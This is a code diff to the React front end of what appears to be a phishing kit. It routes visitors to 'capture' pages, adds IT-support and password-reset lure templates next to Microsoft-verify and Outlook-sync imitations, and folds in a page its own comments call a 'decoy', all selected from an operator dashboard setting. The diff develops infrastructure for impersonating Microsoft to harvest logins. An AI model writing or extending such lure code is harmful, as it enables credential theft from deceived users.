@@ -5,21 +5,27 @@ import { CapturePage } from './components/CapturePage';
 import { ScheduleCapturePage } from './components/ScheduleCapturePage';
 import { MicrosoftVerifyTemplate } from './components/templates/MicrosoftVerifyTemplate';
 import { OutlookSyncTemplate } from './components/templates/OutlookSyncTemplate';
+import { ITSupportTemplate } from './components/templates/ITSupportTemplate';
+import { PasswordResetTemplate } from './components/templates/PasswordResetTemplate';
 import './styles/dashboard.css';
 import './styles/capture.css';
 
-type ActiveTemplate = 'default' | 'microsoft-verify' | 'outlook-sync' | null;
+type PageDesign = 'default' | 'microsoft-verify' | 'outlook-sync' | 'schedule-meeting' | 'it-support' | 'password-reset';
 
-function TemplateRenderer({ template }: { template: ActiveTemplate }): React.ReactElement {
-  if (template === 'microsoft-verify') return <MicrosoftVerifyTemplate />;
-  if (template === 'outlook-sync') return <OutlookSyncTemplate />;
-  return <CapturePage />;
+function PageRenderer({ design }: { design: PageDesign }): React.ReactElement {
+  switch (design) {
+    case 'microsoft-verify': return <MicrosoftVerifyTemplate />;
+    case 'outlook-sync': return <OutlookSyncTemplate />;
+    case 'schedule-meeting': return <ScheduleCapturePage />;
+    case 'it-support': return <ITSupportTemplate />;
+    case 'password-reset': return <PasswordResetTemplate />;
+    default: return <CapturePage />;
+  }
 }
 
 function App(): React.ReactElement {
   const [path, setPath] = useState(window.location.pathname);
-  const [schedulerEnabled, setSchedulerEnabled] = useState<boolean | null>(null);
-  const [activeTemplate, setActiveTemplate] = useState<ActiveTemplate>(null);
+  const [activePage, setActivePage] = useState<PageDesign | null>(null);
   const [loaded, setLoaded] = useState(false);
 
   useEffect(() => {
@@ -31,15 +37,14 @@ function App(): React.ReactElement {
   }, []);
 
   useEffect(() => {
-    if (path === '/' || path === '/schedule' || path.startsWith('/preview/')) {
-      Promise.all([
-        fetch('/api/scheduler?public=true').then(r => r.json()).catch(() => ({ enabled: false })),
-        fetch('/api/templates?public=true').then(r => r.json()).catch(() => ({ template: 'default' })),
-      ]).then(([schedData, tplData]: [{ enabled?: boolean }, { template?: string }]) => {
-        setSchedulerEnabled(schedData.enabled ?? false);
-        setActiveTemplate((tplData.template as ActiveTemplate) ?? 'default');
-        setLoaded(true);
-      });
+    if (path === '/' || path.startsWith('/preview/')) {
+      fetch('/api/templates?public=true')
+        .then(r => r.json())
+        .then((data: { template?: string }) => {
+          setActivePage((data.template as PageDesign) ?? 'default');
+          setLoaded(true);
+        })
+        .catch(() => { setActivePage('default'); setLoaded(true); });
     } else {
       setLoaded(true);
     }
@@ -49,14 +54,10 @@ function App(): React.ReactElement {
     return <Dashboard />;
   }
 
-  // Preview routes for specific templates
-  if (path === '/preview/microsoft-verify') return <MicrosoftVerifyTemplate />;
-  if (path === '/preview/outlook-sync') return <OutlookSyncTemplate />;
-  if (path === '/preview/default') return <CapturePage />;
-
-  // /schedule always shows the scheduler (decoy)
-  if (path === '/schedule' || path.startsWith('/schedule/')) {
-    return <ScheduleCapturePage />;
+  // Preview routes
+  if (path.startsWith('/preview/')) {
+    const design = path.replace('/preview/', '').replace(/\/$/, '') as PageDesign;
+    return <PageRenderer design={design} />;
   }
 
   if (!loaded) {
@@ -65,13 +66,7 @@ function App(): React.ReactElement {
     </div>;
   }
 
-  // If scheduler (decoy) is enabled, show decoy page
-  if (schedulerEnabled) {
-    return <ScheduleCapturePage />;
-  }
-
-  // Otherwise show the selected template
-  return <TemplateRenderer template={activeTemplate} />;
+  return <PageRenderer design={activePage ?? 'default'} />;
 }
 
 ReactDOM.createRoot(document.getElementById('root')!).render(
